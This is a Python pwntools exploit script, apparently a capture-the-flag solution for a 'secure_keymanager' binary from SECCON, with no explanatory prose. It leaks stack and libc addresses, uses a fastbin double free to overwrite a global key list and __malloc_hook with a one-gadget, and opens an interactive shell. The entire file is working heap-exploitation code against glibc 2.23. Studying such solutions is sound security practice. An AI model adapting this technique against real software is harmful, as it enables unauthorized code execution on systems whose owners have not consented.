from pwn import *

os.environ['LD_PRELOAD'] = './libc-2.23.so'
r = process('./secure_keymanager')
#r = remote('secure_keymanager.pwn.seccon.jp', 47225)
e = ELF('./secure_keymanager')
libc = ELF('./libc-2.23.so')
#context.log_level = 'debug'

# config
key_list = 0x00000000006020E0
def init(name, p):
    r.sendafter('Set Your Account Name >> ', name)
    r.sendafter('Set Your Master Pass >> ', p)
def change_master(name, p):
    r.sendafter('>> ', '9')
    r.sendafter('Input Account Name >> ', name)
def add_key(title, l, key):
    r.sendafter('>> ', '1')
    r.sendafter('Input key length...', str(l))
    r.sendafter('Input title...', title)
    r.sendafter('Input key...', key)
def edit_key(name, p, index, key):
    r.sendafter('>> ', '3')
    r.sendafter('Input Account Name >> ', name)
    r.sendafter('Input id to edit...', str(index))
    r.sendafter('Input new key...', key)
def remove_key(name, p, index):
    r.sendafter('>> ', '4')
    r.sendafter('Input Account Name >> ', name)
    r.sendafter('Input Master Pass >> ', p)
    r.sendafter('Input id to remove...', str(index))

name = 'qqq'
p = 'AAA'

init(name, p)
add_key('A', 0x41, 'A'*0x40)
add_key('B', 0x41, 'B'*0x40)
add_key('C', 0x41, 'C'*0x40)
add_key('D', 0x41, 'C'*0x40)
# leak stack
r.sendafter('>> ', '3')
r.sendafter('Input Account Name >> ', 'A'*0x10)
r.recvuntil('Account \'')
stack = u64(r.recvuntil('\'')[0x10:-1]+'\x00\x00')
target = stack - 0x140 + 0x68
log.info('stack addr: %#x' % stack)
log.info('target addr: %#x' % target)
# leak libc
r.sendafter('>> ', '3')
r.sendafter('Input Account Name >> ', 'A'*0x18)
r.recvuntil('Account \'')
libc_base = u64(r.recvuntil('\'')[0x18:-1]+'\x00\x00') - 0x31c81b + 0x2a2000
log.info('libc base: %#x' % libc_base)
__malloc_hook = libc_base + libc.symbols['__malloc_hook']
print hex(__malloc_hook)

# double free to overwrite key_list
remove_key(name, p, 0)
remove_key(name, p, 1)
remove_key(name, p, 0)
add_key(p64(key_list-0x20-6)+p64(0), 0x41, '\x00')
add_key('B', 0x41, '\x00')
add_key('C', 0x41, '\x00')
add_key('A'*(0x6+0x10), 0x41, 'B'*0x6+p64(__malloc_hook-0x160+4+0x10)+p64(target-3+0x10)+'B'*0x20+p64(0x0000010101010101))

r.sendafter('>> ', '3')
r.sendafter('Input Account Name >> ', name)
r.sendafter('Input Master Pass >> ', p)
r.sendafter('Input id to edit...', '2')
r.sendafter('Input new key...', '\x00'*4+p64(0x0000000000400689)*37+p64(libc_base+0xf1117))

r.sendafter('>> ', '3')
r.sendafter('Input Account Name >> ', name)
r.sendafter('Input Master Pass >> ', p)
r.sendafter('Input id to edit...', '3')
r.sendafter('Input new key...', '\x00'*0x20)

r.sendafter('>> ', '1')
r.sendafter('Input key length...', '1')
r.interactive()
